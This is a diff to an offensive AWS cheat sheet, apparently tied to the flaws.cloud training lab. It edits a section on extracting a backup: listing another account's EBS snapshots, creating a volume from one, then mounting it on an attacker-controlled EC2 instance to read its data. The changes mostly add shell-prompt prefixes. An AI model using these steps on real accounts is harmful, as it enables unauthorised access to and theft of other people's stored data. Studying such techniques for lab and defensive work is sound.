@@ -152,22 +152,24 @@ aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWr
 ## AWS - Extract Backup
 
 ```powershell
-aws --profile flaws sts get-caller-identity
+$ aws --profile flaws sts get-caller-identity
 "Account": "XXXX26262029",
 
-aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+
+$ aws --profile profile_name ec2 describe-snapshots
+$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
 "SnapshotId": "snap-XXXX342abd1bdcb89",
 
 Create a volume using snapshot
-aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
 In Aws Console -> EC2 -> New Ubuntu
-chmod 400 YOUR_KEY.pem
-ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
+$ chmod 400 YOUR_KEY.pem
+$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
 
 Mount the volume
-lsblk
-sudo file -s /dev/xvda1
-sudo mount /dev/xvda1 /mnt
+$ lsblk
+$ sudo file -s /dev/xvda1
+$ sudo mount /dev/xvda1 /mnt
 ```
 
 ## Bucket juicy data
